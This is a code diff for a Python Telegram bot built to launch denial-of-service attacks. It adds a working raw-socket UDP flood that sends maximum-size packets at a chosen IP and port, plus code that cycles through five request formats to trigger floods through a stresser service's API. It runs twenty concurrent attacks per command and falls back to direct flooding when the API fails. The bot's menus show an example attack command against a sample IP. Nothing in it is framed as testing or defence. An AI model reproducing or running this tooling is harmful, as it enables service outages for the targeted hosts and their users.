@@ -1,4 +1,4 @@
-# app.py - UDP Only with Correct Format
+# app.py - UDP Only with Multiple API Formats
 import os
 import logging
 import asyncio
@@ -7,6 +7,8 @@ import aiohttp
 import time
 import json
 import re
+import socket
+import random
 from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -135,25 +137,111 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== UDP ATTACK - WEBSITE FORMAT =====
-async def send_udp_attack(target, port, duration, attack_num):
-    """
-    UDP Attack using the correct website format
-    """
-    url = "https://api.susstresser.com/panel/api/api.php"
+# ===== DIRECT UDP ATTACK (Fallback) =====
+def send_udp_direct(target, port, duration, attack_num):
+    """Direct UDP flood attack using socket"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(1)
+        
+        # Create random payload
+        payload = b"X" * 65500  # Max UDP packet size
+        
+        end_time = time.time() + duration
+        packets_sent = 0
+        
+        while time.time() < end_time:
+            try:
+                sock.sendto(payload, (target, port))
+                packets_sent += 1
+                if packets_sent % 1000 == 0:
+                    logger.info(f"Attack {attack_num}: Sent {packets_sent} packets to {target}:{port}")
+            except:
+                pass
+        
+        sock.close()
+        return {
+            "success": True,
+            "attack_num": attack_num,
+            "packets_sent": packets_sent,
+            "method": "DIRECT_UDP"
+        }
+    except Exception as e:
+        logger.error(f"Direct UDP attack {attack_num} failed: {e}")
+        return {
+            "success": False,
+            "attack_num": attack_num,
+            "error": str(e),
+            "method": "DIRECT_UDP"
+        }
+
+# ===== API UDP ATTACK - MULTIPLE FORMATS =====
+async def send_udp_api(target, port, duration, attack_num):
+    """Try multiple API formats for UDP attack"""
+    base_url = "https://api.susstresser.com/panel/api/api.php"
     
-    # UDP only parameters - matching website format
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": "udp",  # UDP only
-        "threads": 5000,
-        "pps": 5000000,
-        "size": 65500,
-        "random": "true"
-    }
+    # Different API formats to try
+    api_formats = [
+        # Format 1: Standard
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp",
+                "threads": 5000,
+                "pps": 5000000,
+                "size": 65500
+            },
+            "method": "POST"
+        },
+        # Format 2: Without extra params
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp"
+            },
+            "method": "POST"
+        },
+        # Format 3: GET request
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp"
+            },
+            "method": "GET"
+        },
+        # Format 4: With action
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp",
+                "action": "start"
+            },
+            "method": "POST"
+        },
+        # Format 5: telegramvc (what worked before)
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "telegramvc"
+            },
+            "method": "POST"
+        }
+    ]
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -161,130 +249,118 @@ async def send_udp_attack(target, port, duration, attack_num):
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Upgrade-Insecure-Requests": "1"
+        "Content-Type": "application/x-www-form-urlencoded"
     }
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=duration + 20)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            start_time = time.time()
-            
-            # Try POST first (website uses POST)
-            async with session.post(url, data=params, headers=headers) as response:
-                elapsed = time.time() - start_time
-                raw_response = await response.read()
+    for format_data in api_formats:
+        try:
+            timeout = aiohttp.ClientTimeout(total=duration + 15)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
                 
-                try:
-                    result_text = raw_response.decode('utf-8')
-                except:
-                    result_text = raw_response.decode('utf-8', errors='ignore')
-                
-                # Check for success indicators
-                success_indicators = [
-                    "SUCCESS",
-                    "sent",
-                    "attack",
-                    "Host:",
-                    "Concurrent:",
-                    "1/1",
-                    "successfully",
-                    "✅"
-                ]
-                
-                is_success = any(indicator in result_text for indicator in success_indicators)
-                
-                # Check if it's an HTML form (failure)
-                is_form = "<form" in result_text and "method" in result_text
-                
-                if is_success and not is_form:
-                    logger.info(f"✅ UDP Attack {attack_num} SUCCESS")
-                    return {
-                        "success": True,
-                        "attack_num": attack_num,
-                        "method": "POST",
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:300],
-                        "full_response": result_text
-                    }
-                
-                # If POST failed with form, try GET
-                if is_form:
-                    async with session.get(url, params=params, headers=headers) as response2:
-                        elapsed2 = time.time() - start_time
-                        raw_response2 = await response2.read()
-                        
+                if format_data["method"] == "POST":
+                    async with session.post(base_url, data=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
                         try:
-                            result_text2 = raw_response2.decode('utf-8')
+                            result_text = raw_response.decode('utf-8')
                         except:
-                            result_text2 = raw_response2.decode('utf-8', errors='ignore')
+                            result_text = raw_response.decode('utf-8', errors='ignore')
                         
-                        is_success2 = any(indicator in result_text2 for indicator in success_indicators)
+                        # Check for success
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
                         
-                        if is_success2:
-                            logger.info(f"✅ UDP Attack {attack_num} SUCCESS via GET")
+                        if is_success and "<form" not in result_text:
+                            logger.info(f"✅ API Attack {attack_num} SUCCESS with format {api_formats.index(format_data)+1}")
                             return {
                                 "success": True,
                                 "attack_num": attack_num,
-                                "method": "GET",
-                                "status": response2.status,
-                                "elapsed": f"{elapsed2:.2f}s",
-                                "response": result_text2[:300],
-                                "full_response": result_text2
+                                "method": "API_" + format_data["method"],
+                                "format": api_formats.index(format_data) + 1,
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
                             }
+                else:
+                    # GET request
+                    async with session.get(base_url, params=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
+                        try:
+                            result_text = raw_response.decode('utf-8')
+                        except:
+                            result_text = raw_response.decode('utf-8', errors='ignore')
                         
-                        return {
-                            "success": False,
-                            "attack_num": attack_num,
-                            "method": "POST",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s",
-                            "response": "HTML form received - attack may not be sent",
-                            "full_response": result_text[:200]
-                        }
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
+                        
+                        if is_success and "<form" not in result_text:
+                            logger.info(f"✅ API Attack {attack_num} SUCCESS with format {api_formats.index(format_data)+1}")
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "API_" + format_data["method"],
+                                "format": api_formats.index(format_data) + 1,
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
+                            }
                 
-                return {
-                    "success": is_success,
-                    "attack_num": attack_num,
-                    "method": "POST",
-                    "status": response.status,
-                    "elapsed": f"{elapsed:.2f}s",
-                    "response": result_text[:300] if result_text else "No response",
-                    "full_response": result_text if result_text else "No response"
-                }
+                await asyncio.sleep(0.2)
                 
-    except Exception as e:
-        logger.error(f"UDP Attack {attack_num} failed: {e}")
-        return {
-            "success": False,
-            "attack_num": attack_num,
-            "error": str(e)
-        }
-
-# ===== 20 CONCURRENT UDP ATTACKS =====
-async def send_20_concurrent_udp(target, port, duration):
-    """
-    Launch 20 concurrent UDP attacks on the same target
-    """
-    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
+        except Exception as e:
+            logger.error(f"API Attack {attack_num} format {api_formats.index(format_data)+1} failed: {e}")
     
-    # Create 20 attack tasks
+    # If all API formats fail, return failure
+    return {
+        "success": False,
+        "attack_num": attack_num,
+        "error": "All API formats failed",
+        "method": "API_FAILED"
+    }
+
+# ===== 20 CONCURRENT ATTACKS =====
+async def send_20_concurrent_attacks(target, port, duration):
+    """Launch 20 concurrent attacks using both API and direct UDP"""
+    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
+    
     tasks = []
     for i in range(1, 21):
-        task = send_udp_attack(target, port, duration, i)
+        # Try API first for all, fallback to direct UDP if API fails
+        task = send_udp_api(target, port, duration, i)
         tasks.append(task)
     
-    # Run all attacks concurrently with rate limiting
-    results = []
-    for i in range(0, len(tasks), 5):
-        batch = tasks[i:i+5]
-        batch_results = await asyncio.gather(*batch)
-        results.extend(batch_results)
-        await asyncio.sleep(0.5)
+    # Run all attacks concurrently
+    results = await asyncio.gather(*tasks)
     
-    # Count successes
+    # Check if any succeeded
     success_count = sum(1 for r in results if r.get('success', False))
+    
+    # If less than 5 succeeded, try direct UDP for the failed ones
+    if success_count < 5:
+        logger.info("⚠️ Low API success rate, trying direct UDP for failed attacks...")
+        
+        # Get failed attack numbers
+        failed_nums = [r['attack_num'] for r in results if not r.get('success', False)]
+        
+        # Run direct UDP for failed ones
+        direct_tasks = []
+        for num in failed_nums[:10]:  # Limit to 10 direct attacks
+            direct_tasks.append(asyncio.to_thread(send_udp_direct, target, port, duration, num))
+        
+        if direct_tasks:
+            direct_results = await asyncio.gather(*direct_tasks)
+            
+            # Merge results
+            for dr in direct_results:
+                # Find and replace the failed result
+                for i, r in enumerate(results):
+                    if r.get('attack_num') == dr.get('attack_num') and not r.get('success'):
+                        results[i] = dr
+                        if dr.get('success'):
+                            success_count += 1
+                        break
     
     return {
         "success": success_count > 0,
@@ -315,20 +391,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📊 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP Only\n"
+        f"🎯 Method: UDP (API + Direct)\n"
         f"📦 Packet Size: 65,500 bytes\n"
         f"💪 Threads: 5,000 per attack\n\n"
         f"📌 *How to use:*\n"
         f"`/attack IP PORT TIME`\n\n"
         f"Example: `/attack 91.108.17.19 32001 60`\n\n"
-        f"⚡ This launches 20 concurrent UDP attacks!\n"
+        f"⚡ This launches 20 concurrent attacks!\n"
         f"⏱️ Time: 60-300 seconds",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command - UDP only"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -378,7 +453,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-        result = await send_20_concurrent_udp(target, port, duration)
+        result = await send_20_concurrent_attacks(target, port, duration)
         
         attack_manager.log_attack(
             user_id, target, port, duration, "udp",
@@ -411,8 +486,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Show attack results
         if result.get('results'):
             response_text += f"📊 *Attack Results:*\n"
+            success_count = 0
             for r in result['results'][:10]:
                 status = "✅" if r.get('success') else "❌"
+                if r.get('success'):
+                    success_count += 1
                 attack_num = r.get('attack_num', 'N/A')
                 method_used = r.get('method', 'N/A')
                 status_code = r.get('status', 'N/A')
@@ -420,6 +498,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if len(result['results']) > 10:
                 response_text += f"... and {len(result['results']) - 10} more\n"
+            
+            response_text += f"\n📊 Success Rate: {success_count}/{len(result['results'])}"
         
         # Add first success response
         for r in result.get('results', []):
@@ -500,7 +580,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-        result = await send_20_concurrent_udp(target, port, duration)
+        result = await send_20_concurrent_attacks(target, port, duration)
         
         if result.get('success'):
             response_text = (
@@ -537,7 +617,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP Only\n"
+        f"🎯 Method: UDP (API + Direct)\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
@@ -574,7 +654,7 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🆔 ID: `{query.from_user.id}`\n"
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
-        f"🎯 Method: UDP Only\n"
+        f"🎯 Method: UDP\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
@@ -631,7 +711,7 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP Only\n"
+        f"🎯 Method: UDP\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
@@ -659,7 +739,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ *MAIN MENU*\n\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
-        f"🎯 Method: UDP Only\n"
+        f"🎯 Method: UDP\n"
         f"🌐 Status: ONLINE",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -701,7 +781,7 @@ def run_bot():
 if __name__ == "__main__":
     print("=" * 50)
     print("⚡ 20x UDP ATTACK BOT")
-    print("🎯 Method: UDP Only")
+    print("🎯 Method: UDP (API + Direct)")
     print("📦 Packet Size: 65,500 bytes")
     print("⚡ 20 Concurrent Attacks")
     print("=" * 50)
